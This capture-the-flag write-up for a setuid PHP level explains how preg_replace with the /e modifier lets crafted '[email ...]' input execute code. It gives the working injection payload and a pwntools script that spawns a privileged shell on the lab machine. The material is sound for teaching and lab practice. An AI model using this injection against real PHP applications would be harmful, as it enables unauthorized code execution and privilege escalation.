# Level 09

## Discription

> There’s a C setuid wrapper for some vulnerable PHP code. \
\
> To do this level, log in as the level09 account with the password level09. Files for this level can be found in /home/flag09.

## Source Code

```php
<?php

function spam($email)
{
  $email = preg_replace("/\./", " dot ", $email);
  $email = preg_replace("/@/", " AT ", $email);
  
  return $email;
}

function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);

  $contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
  $contents = preg_replace("/\[/", "<", $contents);
  $contents = preg_replace("/\]/", ">", $contents);

  return $contents;
}

$output = markup($argv[1], $argv[2]);

print $output;

?>
```

## Solution

This challenge took a bit research to get aware of the issue in this code.  

Starting with code explanation, spam function replace `.` with ` dot ` and `@` with `AT` in $email.

```php
function spam($email)
{
  $email = preg_replace("/\./", " dot ", $email);
  $email = preg_replace("/@/", " AT ", $email);
 
  return $email;
}
```

Next, markup function is the soul of whole program. First line reads the content of the file passed with $filename parameter and save it in $content.

```php
$contents = file_get_contents($filename);
```

Then using regex it looks for `[email xxxxx]` in $content where, xxxxx is send to the spam function to replace `.` and `@` with `dot` and `at` receptively.

```php
$contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
```

In next 2 lines it looks for `[` in xxxxx and replace it with `<` and `]` with `>`.

```php
$contents = preg_replace("/\[/", "<", $contents);
$contents = preg_replace("/\]/", ">", $contents);
```

Let's test the program. 

![](Images/example.png)

So the program is working as it should be. But did you notice `/e`[ pattern modifier](https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php)  in `$contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);`, `e` when used with prep_replace function execute second parameter of prep_replace function as php code i.e it can execute return value of spam function as php code.

So there are two conditions if we want to execute our input as php code, first we have write our payload in place of xxxxx in [email xxxxx] to satisfy this condition `"/(\[email (.*)\])/e"`.

second we cannot use `.` or `@` as spam function will replace them. 

And we cannot just simply do `system(command)` as it will interpret it as a normal string to make our payload work we have to use [PHP Complex(Curly) Syntax](http://php.net/manual/en/language.types.string.php#language.types.string.parsing.complex), So system function get called with our command as parameter. 

Our payload will look like - 

```php
[email {${system(command)}}]
```

Or we can use $use_me parameter of markup function as it is not being used anywhere.

```php
[email {${system($use_me)}}]
```

![](Images/solution.png)

## Python

```python
#!/usr/bin/python3

from pwn import *
from sys import argv,exit

if len(argv) < 2:
	sys.exit("Target IP Missing") 

level09 = ssh(host=argv[1],user='level09',password='level09')
level09_shell = level09.shell('sh')
level09_shell.sendline("echo '[email {${system($use_me)}}]' > /tmp/this")
level09_shell.sendline("/home/flag09/flag09 /tmp/this sh")
level09_shell.sendline("getflag")
level09_shell.interactive()
```
